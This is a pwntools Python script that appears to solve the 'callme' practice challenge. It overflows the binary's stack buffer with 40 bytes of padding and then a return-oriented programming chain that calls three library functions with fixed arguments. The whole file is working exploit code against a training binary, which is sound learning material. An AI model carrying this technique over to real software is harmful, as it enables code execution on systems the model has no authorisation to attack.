from pwn import *

elf = context.binary = ELF('callme')

callme_one = p64(elf.symbols.callme_one)
callme_two = p64(elf.symbols.callme_two)
callme_three = p64(elf.symbols.callme_three)
pop = p64(0x000000000040093c)
args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# payload = b'A' * 40 + pop + args + callme_one + pop + args + callme_two + pop + args + callme_three

ropdata = ROP(elf)
ropdata.callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
ropdata.callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
ropdata.callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
info(ropdata.dump())
chain = ropdata.chain()

payload = b'A' * 40 + chain
p = process(elf.path)
p.sendlineafter('> ', payload)
print(p.recvall(timeout=0.5))
